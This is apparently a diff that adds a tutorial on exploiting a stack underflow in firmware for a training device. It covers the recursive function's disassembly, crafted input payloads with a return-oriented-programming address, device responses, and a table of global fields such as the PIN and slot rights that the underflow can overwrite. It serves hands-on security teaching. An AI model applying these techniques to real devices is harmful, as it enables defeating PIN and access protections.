@@ -1,0 +1,106 @@
+tutorial1 stack underflow exploitation
+-----------------------------------------
+
+1) Black box exploitation
+
+This bug is not easy to spot without access to the firmware because to provoke it you need a quite big buffer, and this big buffer will also trigger the buffer overflow bug.
+
+
+2) White box exploitation
+
+Looking at source code (or reverse engineering the disassembly version of it), you can notice the use of recursion to write into slots (see recursive_write_digit function).
+The stack usage will depend on the number of digits of the value to write you pass.
+Also, there is no check on the number of digits, so you can make the stack goes as low as you want.
+Lastly, the stack is placed after the global variables, so by lower the stack bottom you might be able to overwrite global data like the PIN code or the slots.
+
+Here is the recursive function:
+                recursive_write_digit:
+  0x800'1fc2: 0xb570         PUSH     {R4-R6, LR}
+  0x800'1fc4: 0x0004         MOVS     R4, R0
+  0x800'1fc6: 0x000d         MOVS     R5, R1
+  0x800'1fc8: 0x0016         MOVS     R6, R2
+  0x800'1fca: 0x1e68         SUBS     R0, R5, #1
+  0x800'1fcc: 0x4286         CMP      R6, R0
+  0x800'1fce: 0xd20a         BCS.N    @8001fe6
+  0x800'1fd0: 0x1c72         ADDS     R2, R6, #1
+  0x800'1fd2: 0x0029         MOVS     R1, R5
+  0x800'1fd4: 0x0020         MOVS     R0, R4
+  0x800'1fd6: 0xf7ff 0xfff4  BL       recursive_write_digit  ; 0x800'1fc2
+  0x800'1fda: 0x220a         MOVS     R2, #10                ; 0xa
+  0x800'1fdc: 0x5da1         LDRB     R1, [R4, R6]
+  0x800'1fde: 0xfb02 0x1000  MLA      R0, R2, R0, R1
+  0x800'1fe2: 0x3830         SUBS     R0, R0, #48            ; 0x30
+  0x800'1fe4: 0xe001         B.N      @8001fea
+                @8001fe6:
+  0x800'1fe6: 0x5da0         LDRB     R0, [R4, R6]
+  0x800'1fe8: 0x3830         SUBS     R0, R0, #48            ; 0x30
+                @8001fea:
+  0x800'1fea: 0xbd70         POP      {R4-R6, PC}
+Everytimes it is called, it removes 16 bytes to the stack pointer. The 16 bytes look like this:
+**TOP of the stack
+LR 	0x08001fdb
+R6	index of digit
+R5      number of digits      
+R4      address of digits (0x20000266)
+**BOTTOM of the stack
+As an attacker, you have limited control over 2 of the values (index & number of digits).
+Sending command w01111 will generates 4 calls to the recursive, fill the stack with this structure, and decrement the stack pointer by 64 bytes.
+
+You can try it, but to avoid the effect of buffer overflow you can use Return Oriented Programming to return to main (see help file on bufferoverflow).
+>tobin.py w0AABBBBCCCCDDDD\w08002beb123456781234567812345678 s | senda
+<ready...
+<w0AABBBBCCCCDDDD@+
+<ok
+<ready...
+<s
+<device locked
+<0  RW-L
+<1  RW-L
+<2  RW-L
+<3  R--L
+<4  R-IL
+<5  RW--
+<6  R---
+<7  ----
+<ok
+
+Nothing happens. Let's add more digits:
+
+>tobin.py w0AABBBBCCCCDDDD\w08002beb12345678123456781234567812345678 s | senda
+<ERROR: Invalid file handle 134225883
+
+Seems some C library file descriptor for printf at 0x2000014c got overwritten (value 1 replaced by 134225883, which is 0x08001fdb).
+We are not far from our slot information data which is right before, but to overwrite it you must overwrite the printf handle first, and lose printf functionnality.
+
+But if you overwrite our info structure it would look like this:
+
+field       		address     overwritten with 	effect  
+info.locked 		0x20000130  0x66            	still locked              
+info.error  		0x20000131  0x02            	error              
+info.password[0]	0x20000132  0x00            	
+info.password[1]	0x20000133  0x20            	
+info.password[2]	0x20000134  N            	N=number of digits
+info.password[3]	0x20000135  0x00            	
+info.slot[0].value	0x20000136  0x00            	
+info.slot[0].rights	0x20000137  0x00            	slot 0 ---- (no rights)
+info.slot[1].value	0x20000138  I            	current digit index  
+info.slot[1].rights	0x20000139  0x00            	slot 1 ---- (no rights)
+info.slot[2].value	0x2000013A  0x00            	0
+info.slot[2].rights	0x2000013B  0x00            	slot 2 ---- (no rights)
+info.slot[3].value	0x2000013C  0xDB            	0xDB  
+info.slot[3].rights	0x2000013D  0x1F            	slot 3 RWIL (all rights)
+info.slot[4].value	0x2000013E  0x00            	0
+info.slot[4].rights	0x2000013F  0x08            	slot 4 ---L (only unlock right)
+info.slot[5].value	0x20000140  0x66            	0x66  
+info.slot[5].rights	0x20000141  0x02            	slot 5 -W-- (only write rights)
+info.slot[6].value	0x20000142  0x00            	0
+info.slot[6].rights	0x20000143  0x20            	slot 6 ---- (no rights)
+info.slot[7].value	0x20000144  N            	N
+info.slot[7].rights	0x20000145  0x00            	slot 7 ---- (no rights)
+ 
+So even without the prinf issue, exploitation would be limited to:
+- changing unlock password to 0x00,0x20,N,0x00
+- gaining write & increment access to slot 3
+- setting values for slots 3, 4, 5, 6 and 7 (values 0xDB, 0, 0x66, 0, N)
+- gaining write access to slot 5
+
